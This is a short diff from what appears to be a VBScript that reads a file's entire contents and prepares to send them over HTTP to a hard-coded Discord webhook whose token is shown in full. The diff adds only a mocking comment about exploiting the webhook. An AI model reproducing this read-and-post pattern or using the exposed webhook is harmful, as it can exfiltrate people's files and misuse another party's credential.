@@ -28,6 +28,7 @@ tu = file.ReadAll
 Message = tu
 WebhookURL = "https://discord.com/api/webhooks/1080794082256887828/iHQwQbLaEilV1qZGTF20F-wtsPXHTm9vLGyjRXCp2mmzOdN3oZAbjMUIaDZ5ZDbwB13x"
     ' oh no not an intentionally public webhook u found it!!1!
+    ' u shouldnt use ur bot ik what i can exploit now
 
 Set HttpReq = CreateObject("MSXML2.XMLHTTP")
 
